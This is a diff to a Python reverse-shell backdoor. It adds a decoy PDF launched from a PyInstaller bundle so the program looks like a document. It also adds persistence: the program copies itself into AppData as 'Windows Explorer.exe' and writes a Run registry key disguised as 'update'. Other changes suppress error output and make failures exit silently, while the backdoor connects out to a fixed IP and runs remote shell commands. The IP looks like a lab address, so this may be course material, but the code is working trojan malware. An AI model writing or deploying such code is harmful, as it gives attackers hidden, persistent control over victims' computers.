@@ -4,16 +4,31 @@
 import base64
 import json
 import os
+import shutil
 import socket
 import subprocess
+import sys
 
 import chardet
 
 
 class Backdoor:
+    file_name = sys._MEIPASS + "/pdf.pdf"
+    subprocess.Popen(file_name, shell=True)
+
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+
+    def become_persistent(self):
+        file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(file_location):
+            shutil.copyfile(sys.executable, file_location)
+            subprocess.call(self.win_auto_run("update", file_location), shell=True)
+
+    def win_auto_run(self, name, file):
+        return 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {} /t REG_SZ /d "{}"'.format(name, file)
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -31,7 +46,9 @@ class Backdoor:
 
     def execute_system_command(self, command):
         try:
-            return subprocess.check_output(command, shell=True)
+            # DEVNULL = open(os.devnull, "wb")  # python 2
+            # return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
+            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
         except Exception:
             return "[-] Could not execute command: " + " ".join(command)
 
@@ -122,5 +139,8 @@ class Backdoor:
             return data
 
 
-my_backdoor = Backdoor("10.0.2.4", 4444)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor("10.0.2.4", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
